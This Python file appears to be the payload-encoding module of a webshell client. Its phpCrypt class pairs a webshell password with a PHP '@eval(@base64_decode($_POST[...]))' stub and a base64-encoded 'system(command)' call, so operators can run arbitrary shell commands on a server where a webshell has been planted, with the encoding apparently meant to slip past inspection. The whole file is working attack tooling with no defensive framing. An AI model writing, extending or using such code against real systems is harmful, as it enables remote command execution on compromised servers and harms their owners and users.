'''
加密类
可自定义加密方式
'''
import urllib
import base64
import random


class random_str:
    def __init__(self):
        str="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
        self.str=str
    def random(self):
        return random.choice(self.str)

class phpCrypt:
    def __init__(self,passwd,webshell,encrypt="base64",des_encrypt=""):
        self.passwd=passwd
        self.webshell=webshell
        self.random_str=random_str().random()
        self.passwd_data=f"@eval(@base64_decode($_POST['{self.random_str}']));"
    def main(self,command):
        return {
            self.passwd:self.passwd_data,
            self.random_str:self._base64_encode(f"system('{command}');")
        }

    def _base64_encode(self,string):
        # print(string)
        return base64.b64encode(string.encode()).decode()
    def _base64_decode(self,string):
        return base64.b64decode(string.encode()).decode()